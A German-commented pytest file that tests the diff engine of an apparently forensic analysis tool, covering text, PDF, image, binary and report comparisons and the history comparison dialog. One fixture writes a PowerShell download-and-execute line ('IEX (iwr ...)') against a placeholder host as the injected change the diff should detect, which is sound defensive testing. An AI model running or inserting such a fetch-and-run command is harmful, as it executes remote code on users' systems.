"""Vorher-Nachher-Vergleich (engines/diff.py) und der Dialog im Verlauf."""
import os

import numpy as np
import pikepdf
import pytest
from PIL import Image

from core.history import HistoryDB
from engines import run_forensic
from engines.diff import content_diff, report_diff


def _pdf(path, pages):
    pdf = pikepdf.new()
    for text in pages:
        pdf.add_blank_page(page_size=(300, 300))
        stream = f"BT /F1 12 Tf 20 250 Td ({text}) Tj ET".encode()
        pdf.pages[-1].obj["/Contents"] = pdf.make_stream(stream)
    pdf.save(path)
    return path


def test_text_diff(tmp_path):
    a, b = tmp_path / "a.ps1", tmp_path / "b.ps1"
    a.write_text("Write-Host 1\nWrite-Host 2\nWrite-Host 3\n")
    b.write_text("Write-Host 1\nIEX (iwr http://x.invalid)\nWrite-Host 3\n")
    d = content_diff(str(a), str(b))
    assert not d["identical"] and d["text"]["added_lines"] == 1 and d["text"]["removed_lines"] == 1
    assert any(l.startswith("+IEX") for l in d["text"]["unified"])


def test_pdf_page_replaced(tmp_path):
    a = _pdf(tmp_path / "vertrag.pdf", ["Seite eins", "Preis 1000 EUR", "Seite drei"])
    b = _pdf(tmp_path / "vertrag_neu.pdf", ["Seite eins", "Preis 9000 EUR", "Seite drei", "Anhang"])
    d = content_diff(str(a), str(b))
    assert d["pdf"]["pages_a"] == 3 and d["pdf"]["pages_b"] == 4
    assert [(p["page"], p["status"]) for p in d["pdf"]["pages"]] == [(2, "changed"), (4, "added")]
    assert any("9000" in l for l in d["text"]["unified"])


def test_image_region(tmp_path):
    base = np.full((300, 400, 3), 120, np.uint8)
    base[::7, :, 1] = 80
    Image.fromarray(base).save(tmp_path / "a.png")
    edited = base.copy()
    edited[100:160, 200:280] = (250, 20, 20)                  # retuschierte Stelle
    Image.fromarray(edited).save(tmp_path / "b.png")
    png = tmp_path / "heat.png"
    d = content_diff(str(tmp_path / "a.png"), str(tmp_path / "b.png"), out_png=str(png))
    im = d["image"]
    assert 0.03 < im["changed_ratio"] < 0.06 and len(im["regions"]) == 1
    x, y, w, h = im["regions"][0]
    assert x <= 200 < x + w and y <= 100 < y + h and w <= 120 and h <= 100
    assert png.exists()


def test_identical_and_binary(tmp_path):
    a, b, c = tmp_path / "a.bin", tmp_path / "b.bin", tmp_path / "c.bin"
    a.write_bytes(os.urandom(2000))
    b.write_bytes(a.read_bytes())
    c.write_bytes(a.read_bytes()[:1000] + b"PATCHED" + a.read_bytes()[1007:])
    assert content_diff(str(a), str(b))["identical"]
    d = content_diff(str(a), str(c))
    assert d["bytes"]["ranges"] and d["bytes"]["ranges"][0]["a"][0] == 1000


def test_report_diff(tmp_path, docx_file):
    import docx
    ra = run_forensic(str(docx_file))
    d = docx.Document(docx_file)
    d.core_properties.author = "Fälscher"
    d.add_paragraph("neu")
    p2 = tmp_path / "brief2.docx"
    d.save(p2)
    rb = run_forensic(str(p2))
    rd = report_diff(ra, rb)
    keys = {m["key"]: m for m in rd["metadata"]}
    assert "Author" in keys or any("Creator" in k or "author" in k.lower() for k in keys)


def test_compare_dialog_from_history(tmp_path):
    os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")
    QtWidgets = pytest.importorskip("PyQt6.QtWidgets")
    app = QtWidgets.QApplication.instance() or QtWidgets.QApplication([])  # noqa: F841 – Referenz halten
    from core.sandbox import diff_isolated
    from gui.history_view import HistoryView
    db = HistoryDB(tmp_path / "h.db")
    a = _pdf(tmp_path / "v1.pdf", ["Seite eins", "Preis 1000 EUR"])
    b = _pdf(tmp_path / "v2.pdf", ["Seite eins", "Preis 9000 EUR"])
    db.record(run_forensic(str(a)))
    db.record(run_forensic(str(b)))
    hv = HistoryView(db=db)
    assert not hv.btn_compare.isEnabled()
    hv.table.selectAll()
    assert hv.btn_compare.isEnabled()
    dlg = hv.compare_selected(exec_dialog=False, diff_fn=diff_isolated, run_async=False)
    app.processEvents()
    assert "v1.pdf" in dlg.lbl.text().split("⇄")[0]                 # ältere = A
    assert dlg.tbl_pages.rowCount() == 1 and dlg.tbl_pages.item(0, 1).text() == "changed"
    assert "9000" in dlg.txt_content.toPlainText()
    # Datei verschwunden → Metadaten-Vergleich bleibt, Inhalt mit Hinweis
    b.unlink()
    dlg2 = hv.compare_selected(exec_dialog=False, run_async=False)
    assert "Missing" in dlg2.txt_content.toPlainText()


def test_buttons_open_their_dialogs(tmp_path, monkeypatch):
    """Regression: clicked(bool) darf nicht als Parameter in die Handler rutschen."""
    os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")
    QtWidgets = pytest.importorskip("PyQt6.QtWidgets")
    app = QtWidgets.QApplication.instance() or QtWidgets.QApplication([])  # noqa: F841 – Referenz halten
    import gui.route_dialog as rdm
    import gui.diff_dialog as ddm
    from gui.history_view import HistoryView
    opened = []
    monkeypatch.setattr(rdm.RouteDialog, "exec", lambda self: opened.append("route") or 0)
    monkeypatch.setattr(ddm.DiffDialog, "exec", lambda self: opened.append("diff") or 0)
    db = HistoryDB(tmp_path / "h.db")
    for n in ("a.txt", "b.txt"):
        (tmp_path / n).write_text(n)
        db.record(run_forensic(str(tmp_path / n)))
    hv = HistoryView(db=db)
    hv.btn_route.click()
    hv.table.selectAll()
    hv.btn_compare.click()
    assert opened == ["route", "diff"]
